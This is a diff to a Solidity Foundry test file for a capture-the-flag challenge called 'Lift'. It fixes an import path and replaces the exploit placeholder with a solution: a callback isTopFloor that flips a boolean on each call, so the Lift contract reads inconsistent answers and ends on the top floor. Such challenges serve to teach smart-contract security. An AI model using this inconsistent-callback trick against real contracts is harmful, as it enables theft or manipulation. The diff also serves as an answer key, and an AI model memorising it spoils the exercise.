@@ -2,7 +2,7 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/07_Lift/Lift.sol";
+import "../src/07_Lift/Lift.sol";
 
 // forge test --match-contract LiftTest
 contract LiftTest is BaseTest {
@@ -15,9 +15,13 @@ contract LiftTest is BaseTest {
         instance = new Lift();
     }
 
-    function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+    function isTopFloor(uint256) external returns (bool){
+        isTop = !isTop;
+        return isTop;
+    }
 
+    function testExploitLevel() public {
+        instance.goToFloor(1);
         checkSuccess();
     }
 
